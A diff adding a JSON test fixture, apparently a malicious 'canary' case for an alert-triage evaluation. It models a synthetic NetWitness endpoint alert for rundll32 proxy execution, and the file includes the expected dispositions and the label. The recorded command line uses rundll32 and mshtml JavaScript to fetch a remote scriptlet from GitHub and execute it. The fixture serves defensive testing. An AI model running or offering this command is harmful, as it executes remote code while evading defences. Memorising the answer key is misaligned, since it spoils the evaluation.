@@ -1,0 +1,140 @@
+{
+  "name": "canary_T1218.011_rundll32_javascript",
+  "description": "Canary (malicious) for T1218.011. Synthetic NetWitness-shaped incident; abused-tool techniques must never be closed as benign.",
+  "canary": {
+    "role": "malicious",
+    "pair": "canary_T1218.011_benign_control_rundll",
+    "technique": "T1218.011",
+    "atomic": "Rundll32 execute JavaScript Remote Payload With GetObject",
+    "atomic_ref": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md"
+  },
+  "incident": {
+    "id": "CANARY-T1218011-MAL",
+    "title": "High Risk Alerts: NetWitness Endpoint for LAB-WIN10",
+    "name": "High Risk Alerts: NetWitness Endpoint for LAB-WIN10",
+    "summary": "",
+    "created": "2026-09-30T02:31:00.000Z",
+    "createdBy": "High Risk Alerts: NetWitness Endpoint",
+    "ruleId": "6618e5a2dddef60d6853bebf",
+    "priority": "MEDIUM",
+    "riskScore": 50,
+    "status": "NEW",
+    "alertCount": 1,
+    "eventCount": 1,
+    "sources": [
+      "ECAT"
+    ],
+    "tactics": [],
+    "techniques": [],
+    "alerts": [
+      {
+        "_id": "CANARY-T1218011-MAL-a1",
+        "receivedTime": 1790000000000,
+        "originalHeaders": {
+          "name": "Rundll32 Script Proxy Execution",
+          "severity": 5,
+          "deviceVendor": "NetWitness",
+          "deviceProduct": "Event Stream Analysis"
+        },
+        "alert": {
+          "name": "Rundll32 Script Proxy Execution",
+          "risk_score": 50.0,
+          "source": "ECAT",
+          "type": [
+            "Endpoint"
+          ],
+          "host_summary": [
+            "LAB-WIN10"
+          ]
+        },
+        "originalAlert": {
+          "moduleName": "Rundll32 Script Proxy Execution",
+          "events": [
+            {
+              "filename_src": [
+                "cmd.exe"
+              ],
+              "directory_src": [
+                "C:\\Windows\\System32\\"
+              ],
+              "param_src": [
+                "cmd.exe"
+              ],
+              "filename_dst": [
+                "rundll32.exe"
+              ],
+              "directory_dst": [
+                "C:\\Windows\\System32\\"
+              ],
+              "param_dst": [
+                "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();"
+              ],
+              "action": [
+                "createProcess"
+              ],
+              "user_src": "LAB-WIN10\\labuser",
+              "user_dst": "LAB-WIN10\\labuser",
+              "owner": "LAB-WIN10\\labuser",
+              "alias_host": [
+                "LAB-WIN10"
+              ],
+              "alias_ip": [
+                "192.168.56.20"
+              ],
+              "ip_src": "192.168.56.20",
+              "device_type": "nwendpoint",
+              "category": "Process Event",
+              "context": [
+                "network.ipv4"
+              ],
+              "OS": [
+                "windows",
+                "Microsoft Windows 10 Pro"
+              ],
+              "cert_thumbprint": [
+                "aeb9b61e47d91c42fff213992b7810a3d562fb12"
+              ],
+              "context_src": [
+                "file.exe",
+                "file.signed",
+                "signature.microsoft"
+              ]
+            }
+          ]
+        },
+        "tactics": [
+          "defense evasion"
+        ],
+        "techniques": [
+          "T1218.011"
+        ]
+      }
+    ]
+  },
+  "data_availability": {
+    "incident_source": "netwitness_live",
+    "alerts_fetch_attempted": true,
+    "alerts_fetch_succeeded": true,
+    "alerts_complete": true,
+    "alerts_count": 1,
+    "journal_fetch_succeeded": null,
+    "warnings": []
+  },
+  "expected": {
+    "disposition_acceptable": [
+      "true_positive",
+      "needs_info"
+    ],
+    "must_not": [
+      "false_positive",
+      "benign_expected"
+    ]
+  },
+  "label": {
+    "value": "true_positive",
+    "source": "synthetic",
+    "labeller": "Aegis Triage Step 2 (canary author)",
+    "date": "2026-10-01",
+    "rationale": "Atomic Red Team T1218.011 test 'Rundll32 execute JavaScript Remote Payload With GetObject'."
+  }
+}
